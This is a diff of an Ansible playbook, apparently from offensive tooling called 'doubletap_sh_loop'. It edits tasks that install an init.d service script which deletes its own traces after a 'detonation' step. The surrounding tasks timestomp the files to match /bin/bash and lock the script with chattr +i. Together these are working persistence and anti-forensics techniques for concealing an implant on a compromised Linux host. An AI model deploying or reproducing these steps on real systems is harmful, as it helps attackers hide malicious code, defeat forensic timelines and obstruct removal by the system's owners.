@@ -110,13 +110,13 @@
   lineinfile:
     path: "{{ doubletap_sh_loop_script_path }}"
     line: "update-rc.d -f {{ doubletap_sh_loop_service_name }} remove"
-    insertafter: "# Detonation"
+    insertafter: "# Cleanup after explosion"
 
 - name: Remove init.d script after execution (cleanup)
   lineinfile:
     path: "{{ doubletap_sh_loop_script_path }}"
     line: "rm -f /etc/init.d/{{ doubletap_sh_loop_service_name }}"
-    insertafter: "# Detonation"
+    insertafter: "# Cleanup after explosion"
 
 - name: Timestomp the initd file
   command: touch -r /bin/bash /etc/init.d/{{ doubletap_sh_loop_service_name }}
@@ -124,6 +124,5 @@
 - name: Timestomp script to match /bin/bash creation time
   command: touch -r /bin/bash {{ doubletap_sh_loop_script_path }}
 
-# TODO check that this should go after timestomp
 - name: Set immutable attribute on script
   command: "chattr +i {{ doubletap_sh_loop_script_path }}"
